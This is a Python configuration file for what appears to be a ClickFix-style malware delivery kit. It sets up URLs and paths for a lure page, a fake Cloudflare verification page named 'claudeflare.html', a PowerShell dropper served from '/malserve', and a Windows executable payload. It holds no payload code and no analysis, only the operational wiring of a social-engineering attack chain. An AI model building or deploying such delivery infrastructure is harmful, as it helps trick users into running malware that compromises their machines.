import os


isDP = os.environ.get("IS_DEPLOYED","NOPE")


socialENGServerFile = "pagesServer.py"
fielServerFile = "filesServer.py"


isDeployed = lambda is_deployed:True if is_deployed=='YEP' else False
proto = lambda is_deployed:'https://' if is_deployed=="YEP" else 'http://'

hookPageEndpoint = "/Replair"
binName = "grim-grammer-v2.exe"
binEndpoint = "/grim-grammer-v2.exe"
dropperEndpoint = "/malserve"
dropperName = "test.ps1"
payloadFolder = f"bin{"/" if isDeployed(isDP) else "\\"}" 
staticFolder = f"static{"/" if isDeployed(isDP) else "\\"}"

port = "443" if isDeployed(isDP) else "80"
host = "localhost" if not isDeployed(isDP) else "UNSETTLED"
deliveryServerPort = "10000"
conf = {
    "URLS":{
        "powershell_dropper_url":f"{proto(isDP)}{host}{dropperEndpoint}",
        "actual_binary_payload":f"{proto(isDP)}{host}{binEndpoint}",
        "clickfix_page":f"{proto(isDP)}{host}{hookPageEndpoint}"
    },
    "PATHS":{
        "cloudflare_page":f"{staticFolder}claudeflare.html",
        "clickfix_page":f"{staticFolder}clickfix.html",
        "dropper":f"{payloadFolder}{dropperName}",
        "binary_payload":f"{payloadFolder}{binName}"
    }
}